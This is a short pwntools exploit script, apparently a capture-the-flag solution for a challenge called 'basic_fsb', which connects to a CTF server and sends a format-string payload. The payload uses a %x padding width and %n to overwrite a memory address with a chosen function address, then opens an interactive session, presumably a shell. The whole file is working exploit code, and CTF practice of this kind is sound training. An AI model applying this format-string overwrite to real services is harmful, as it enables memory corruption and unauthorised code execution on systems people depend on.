from pwn import *

# local test
# p = process("./basic_fsb")

# remote host
p = remote("ctf.j0n9hyun.xyz", 3002)

payload = p32(0x804a00c)
payload += "%{}x".format(0x080485b4 - 4)
payload += "%n"

p.recvuntil("input : ")
p.sendline(payload)

p.interactive()